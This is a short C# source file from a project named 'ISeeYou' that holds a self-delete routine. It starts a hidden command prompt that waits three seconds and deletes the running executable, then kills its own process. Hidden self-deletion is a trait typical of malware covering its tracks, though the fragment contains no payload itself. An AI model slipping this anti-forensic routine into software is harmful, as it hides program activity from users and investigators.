using System.Diagnostics;
using System.Reflection;

namespace ISeeYou
{
    class SelfDelete
    {
        public static void Delete()
        {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " +
                           Assembly.GetExecutingAssembly().Location;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
            Process.GetCurrentProcess().Kill();
        }
    }
}
